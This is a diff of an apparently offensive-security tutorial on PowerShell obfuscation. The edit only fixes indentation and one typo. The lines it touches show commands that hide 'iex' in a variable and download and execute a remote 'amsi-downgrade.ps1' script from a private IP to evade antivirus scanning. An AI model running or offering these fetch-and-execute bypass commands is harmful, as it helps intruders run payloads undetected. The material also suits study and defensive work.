@@ -745,15 +745,15 @@ Here we can view the all process of encoding/decoding in powershell console
            into 'strings' that can deal with that limitation, allowing us to call the statement
            IEX previous stored inside a local powershell variable .. 
            
-           [The conventional way]
-           $obf="iex"
-           $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
-           powershell $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
-           Invoke-Command $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+        [The conventional way]
+        $obf="iex"
+        $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+        powershell $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
+        Invoke-Command $obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')
 
 ![var declaration fail](http://i.cubeupload.com/b4lkyC.jpg)
 
-        [Using Invoke-Command statment wrapped in double quotes]
+        [Using Invoke-Command statement wrapped in double quotes]
         $obf="iex"
         powershell -C "$obf (New-Object Net.WebClient).DownloadSting('http://192.168.1.71/amsi-downgrade.ps1')"
 
